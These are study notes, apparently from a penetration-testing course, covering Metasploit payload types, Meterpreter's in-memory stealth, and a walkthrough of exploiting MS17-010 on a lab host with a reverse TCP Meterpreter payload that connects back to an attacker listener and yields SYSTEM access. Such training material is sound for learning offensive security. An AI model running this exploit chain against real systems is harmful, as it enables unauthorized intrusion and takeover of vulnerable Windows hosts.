# Summary: Metasploit Payloads, Meterpreter & Exploitation Walkthrough

## 📦 Overview of Payloads
- **Definition:** Code sent alongside an exploit to execute on a target OS, establish a foothold, and typically return a shell connection to the attacker.
- **Naming Convention:** The presence of a forward slash (`/`) indicates a staged payload (e.g., `windows/shell/bind_tcp`), whereas inline payloads lack the slash (e.g., `windows/shell_bind_tcp`).

---
## 🛠️ Walkthrough & Methodology: Exploitation with MSFconsole

### Step 1: Launch and Update MSFconsole

Start the Metasploit framework console from your terminal. Use the quiet flag (`-q`) to bypass the banner if desired:

Bash

```
msfconsole -q
```

### Step 2: Search for an Exploit Module

Search for the target vulnerability (e.g., MS17-010 EternalRomance/EternalBlue) using keywords:

Bash

```
msf6 > search ms17_010
```

### Step 3: Select the Exploit Module

Choose the appropriate module by its index number or full path:

Bash

```
msf6 > use 1
```

### Step 4: Configure Target and Global Settings

Check the required options and assign the target IP (`RHOSTS`) and listener IP (`LHOST`):

Bash

```
msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > ifconfig
msf6 exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.10.14.15
```

### Step 5: Filter and Select a Payload

Find and set a Meterpreter reverse TCP payload to gain advanced post-exploitation capabilities:

Bash

```
msf6 exploit(windows/smb/ms17_010_psexec) > grep meterpreter grep reverse_tcp show payloads
msf6 exploit(windows/smb/ms17_010_psexec) > set payload windows/x64/meterpreter/reverse_tcp
```

### Step 6: Review Options and Execute

Verify all required variables are set properly via `options`, then execute the exploit:

Bash

```
msf6 exploit(windows/smb/ms17_010_psexec) > run
```

### Step 7: Interact with the Meterpreter Session

Once the stager successfully downloads the stage, a Meterpreter session opens. Use Meterpreter commands to interact with the target:

Bash

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > help
```




## ⚡ Payload Types
1. **Singles (Inline):** 
   - Self-contained, all-in-one payloads containing both the exploit and shellcode.
   - More stable by design, but can be too large for certain exploits to handle.
2. **Stagers & Stages:**
   - **Stagers:** Small, reliable code that runs on the victim machine, initiates an outbound connection to the attacker's listener, and sets up a communication channel.
   - **Stages:** Advanced, larger payload components (like Meterpreter or VNC injection) downloaded by the stager with no size limits.
- **Reverse vs. Bind Connections:** Reverse connections are generally more effective because they initiate outbound traffic from the victim, bypassing stricter inbound firewall rules.

---

## 💻 The Meterpreter Payload
- **Architecture:** A multi-faceted payload using DLL injection that resides entirely in the target host's memory, leaving no direct traces on the hard drive.
- **Stealth & Flexibility:** Difficult to detect with conventional forensic tools; scripts and plugins can be loaded/unloaded dynamically.
- **Commands:** Operates via a dedicated Meterpreter prompt (e.g., using `getuid` instead of Windows-native commands like `whoami` to check privileges, and `help` to see built-in file system, networking, and core options).

---

## 🔍 Searching and Filtering Payloads
- **List All:** Run `show payloads` inside an active exploit module to see payloads compatible with the target OS architecture.
- **Using Grep for Filtering:** Combine `grep` inside `msfconsole` to quickly narrow down large lists:
  ```text
  grep meterpreter show payloads
  grep meterpreter grep reverse_tcp show payloads